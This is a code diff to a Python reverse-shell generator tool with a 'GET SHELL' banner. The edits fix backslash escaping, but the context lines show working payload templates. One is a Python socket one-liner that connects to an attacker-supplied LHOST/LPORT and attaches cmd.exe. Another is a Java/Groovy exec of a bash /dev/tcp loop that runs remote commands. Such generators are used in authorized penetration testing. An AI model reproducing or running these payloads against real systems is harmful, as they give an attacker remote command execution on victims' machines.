@@ -15,14 +15,14 @@ banner = '''
 
             _.-'|''-._
         .-'     | S    `-.
-      .'\    G  | H     /`.
-    .'   \   E  | E    /   `.
-    \     \  T  | L   /     /
-     `\    \    | L  /    /'
-       `\   \   |   /   /'
-         `\  \  |  /  /'
-        _.-`\ \ | / /'-._
-       {_____  \|//'_____}
+      .'\\    G  | H     /`.
+    .'   \\   E  | E    /   `.
+    \\     \\  T  | L   /     /
+     `\\    \\    | L  /    /'
+       `\\   \\   |   /   /'
+         `\\  \\  |  /  /'
+        _.-`\\ \\ | / /'-._
+       {_____  \\|//'_____}
             jacstory
                
 '''
@@ -55,7 +55,7 @@ class Reverse_Shell_Generator:
                          self.result = 'python.exe -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('\
                                        +f'{self.args.LHOST}'+","+f'{self.args.LPORT}'\
                                        +"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
-                                       os.dup2(s.fileno(),2);p=subprocess.call(['C:\WINDOWS\system32\cmd.exe']);"
+                                       os.dup2(s.fileno(),2);p=subprocess.call(['C:\\WINDOWS\\system32\\cmd.exe']);"
                 self.Base64()
             
             elif "bash" in self.args.type:
@@ -96,7 +96,7 @@ class Reverse_Shell_Generator:
                  
             elif 'java' in self.args.type  and len(self.args.type)==4:
                   self.result = 'self.result = Runtime.getRuntime()'+'\n'+'process = self.result.exec(["/bin/bash","-c","exec 5<>/dev/tcp/'\
-                           +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'\
+                           +f'{self.args.LHOST}'+'/'+f'{self.args.LPORT}'+';cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])'\
                            +'\n'+'process.waitFor()'
                   self.Base64()   
                     
